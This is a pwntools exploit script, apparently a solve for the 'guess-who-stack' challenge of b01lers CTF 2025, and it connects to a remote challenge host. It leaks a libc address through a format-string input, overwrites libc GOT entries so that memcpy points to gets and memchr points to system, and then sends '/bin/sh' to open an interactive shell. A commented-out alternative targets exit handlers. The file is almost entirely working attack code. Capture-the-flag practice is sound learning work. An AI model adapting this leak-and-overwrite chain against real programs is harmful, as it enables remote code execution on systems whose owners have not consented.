from pwn import *

local = 0
pc = './chal'
aslr = True
context.log_level = "debug"
#context.terminal = ["deepin-terminal","-m","splitscreen","-e","bash","-c"]
context.terminal = ['tmux','splitw','-h']
context.arch = "amd64"
context.os = "linux"

libc = ELF('./libc.so.6')
elf = ELF(pc)

p = None
ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    log.critical("{} -> {}".format(s, hex(addr)))

vm = None
def setup_vm(box=None):
    global vm
    try:
        # only load vagd if needed
        from vagd import Dogd, Qegd, Box
    except:
        log.error('Failed to import vagd, either run locally using LOCAL or install it')
    if not vm:
        # Docker
        if box:
            vm = Dogd(pc, image=box, ex=True, fast=True)
        else:
            vm = Dogd(pc, image=Box.DOCKER_UBUNTU, ex=True, fast=True)
        # Qemu
        #vm = Qegd(pc, img=Box.QEMU_UBUNTU, ex=True, fast=True)
    if vm.is_new:
        # additional setup here
        log.info('new vagd instance')

if local == 1:
    p = process(pc,aslr=aslr)
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc-2.37.9000-17.fc39.x86_64.so'})
elif local == 2:
    setup_vm(box="b01lersctf2025:ubuntu22.04")
    p = vm.start()
    #p = vm.start(argv=[], env={}, gdbscript="", **kw)
else:
    remote_addr = ['guess-who-stack.harkonnen.b01lersc.tf', 8443]
    p = remote(remote_addr[0], remote_addr[1], ssl=True)


if __name__ == "__main__":
    ru("First shot...")
    sl("%13$p") #33
    ru("heavy ")
    libc_base = int(rl().strip(), 16) - 0x28150
    lg("libc", libc_base)

    #key = libc_base - 0x2890
    #exit_handler = libc_base + 0x2001b8
    #ogg = libc_base + 0x1106a1

    #p_hash = (ogg<<0x11)&0xffffffffffff8000
    #p_hash += ogg>>0x2f
    #lg("hash", p_hash)
    #lg("key", key)

    #if p_hash > (1<<63)-1: #neg
    #    p_hash -= 1<<64

    #ru("out... ")
    #sl(str(key) + " " + str(0))
    #ru("now... ")
    #sl(str(exit_handler) + " " + str(p_hash))

    memcpy_0_got = libc_base + 0x00000000001FE150
    memchr_got = libc_base + 0x00000000001FE040

    libc.address = libc_base
    writes1 = "{} {}".format(
        memcpy_0_got,
        libc.symbols['gets']
    )
    writes2 = "{} {}".format(
        memchr_got,
        libc.symbols['system']
    )
    ru("out... ")
    sl(writes1)
    ru("now... ")
    sn(writes2)

    sl(" /bin/sh\x00")

    p.interactive()

